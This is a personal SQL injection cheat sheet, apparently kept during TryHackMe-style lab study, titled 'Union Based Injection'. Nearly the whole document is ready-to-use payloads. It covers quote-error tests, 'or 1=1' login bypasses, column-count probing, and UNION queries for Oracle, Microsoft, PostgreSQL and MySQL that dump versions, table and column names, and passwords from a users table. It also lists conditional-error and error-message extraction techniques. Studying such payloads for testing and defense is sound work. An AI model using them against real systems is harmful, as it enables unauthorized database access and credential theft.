---
title: UNION BASED INJECTION
updated: 2023-11-05 07:15:21Z
created: 2023-09-29 07:35:19Z
latitude: -35.28093680
longitude: 149.13000920
altitude: 0.0000
---

`SELECT a, b FROM table1 UNION SELECT c, d FROM table2`  
`' UNION SELECT username, password FROM users--`

`https://website.thm/article?id=1 UNION SELECT 1,2,3`

## Test for Errors

`user'`  
`user"`

## UNION

`SELECT name,address,city,postcode from customers UNION SELECT company,address,city,postcode from suppliers;`

`' UNION SELECT NULL,NULL,NULL,'a'--`

`user' or 1=1#`  
or  
`user' or 1=1-- -`

Find how many columns (union select requires same number of colums as source selected)  
`valid_user' union select null#`  
`valid_user' union select null,null#`  
`valid_user' union select null,null,null#`

Note: if a column represent integer instead of string do:  
`valid_user' union select null(int),null,null#`

If columns request 3...  
**Find Version:**  
`valid_user' union select null,null,@@version#`

**Find Table names:**  
`valid_user' union select null,null,table_name from information_schema.tables#`

**Find Column names:**  
`valid_user' union select null,null,column_name from information_schema.columns#`

**Find Password:**  
`valid\_user' union select null,null,password from <tablename>#</tablename>`

If there are 7 columns for example:  
`' union select null,username,null,null,null,null,null FROM users-- -`

* * *

## Database Version

**Oracle**  
`' UNION SELECT banner FROM v$version`  
`' UNION SELECT version FROM v$instance`  
**Microsoft**  
`' UNION SELECT @@version,NULL--`  
**PostgreSQL**  
`' UNION SELECT NULL,version()--  -`  
**MySQL**  
`' UNION SELECT @@version--`

'+UNION+SELECT+table\_name,+NULL+FROM+information\_schema.tables--

* * *

## FIND TABLE FROM DATABASE

FIND COLUMNS FROM TABLES

`'UNION SELECT table_name, NULL from information_schema.tables--`  
`'UNION SELECT column_name, NULL from information_schema.columns WHERE table=<tablename>--`  
`'UNION SELECT <column1>, NULL <column2> from <tablename>--`

## Database Contents

**Oracle**  
`' UNION SELECT table_name FROM all_tables--`  
`' UNION SELECT * FROM all_tab_columns WHERE table_name = 'TABLE-NAME-HERE'--`  
**Microsoft**  
`' UNION SELECT * FROM information_schema.tables--`  
`' UNION SELECT * FROM information_schema.columns WHERE table_name = 'TABLE-NAME-HERE'--`  
**PostgreSQL**  
`' UNION SELECT datname FROM pg_database--`  
`' UNION SELECT * FROM information_schema.columns WHERE table_name = 'TABLE-NAME-HERE'#`  
**MySQL**  
`UNION SELECT * FROM information_schema.tables-- -`  
`UNION SELECT * FROM information_schema.columns WHERE table_name = 'TABLE-NAME-HERE'/*comment*/`

* * *

## Conditional Errors

You can test a single boolean condition and trigger a database error if the condition is true.  
**Oracle**  
`UNION SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN TO_CHAR(1/0) ELSE NULL END FROM dual`  
**Microsoft**  
`UNION SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN 1/0 ELSE NULL END`  
**PostgreSQL**  
`1 = (SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN 1/(SELECT 0) ELSE NULL END)`  
**MySQL**  
`UNION SELECT IF(YOUR-CONDITION-HERE,(SELECT table_name FROM information_schema.tables),'a')`

* * *

## Extracting data via visible error messages

You can potentially elicit error messages that leak sensitive data returned by your malicious query.  
**Microsoft**  
`UNION SELECT 'foo' WHERE 1 = (SELECT 'secret')`

> Conversion failed when converting the varchar value 'secret' to data type int.

**PostgreSQL**  
`UNION SELECT CAST((SELECT password FROM users LIMIT 1) AS int)`

> invalid input syntax for integer: "secret"

**MySQL**  
`UNION SELECT 'foo' WHERE 1=1 AND EXTRACTVALUE(1, CONCAT(0x5c, (SELECT 'secret')))`